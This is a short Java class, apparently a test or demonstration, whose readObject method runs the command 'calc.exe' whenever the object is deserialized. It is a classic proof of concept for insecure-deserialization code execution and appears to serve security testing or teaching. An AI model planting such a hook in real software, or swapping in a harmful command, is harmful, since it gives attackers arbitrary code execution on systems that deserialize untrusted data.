package com.test.example1;

import java.io.*;

public class MyObject implements Serializable {

    private void readObject(java.io.ObjectInputStream stream)
            throws Exception {
    Runtime.getRuntime().exec("calc.exe");
    }

}
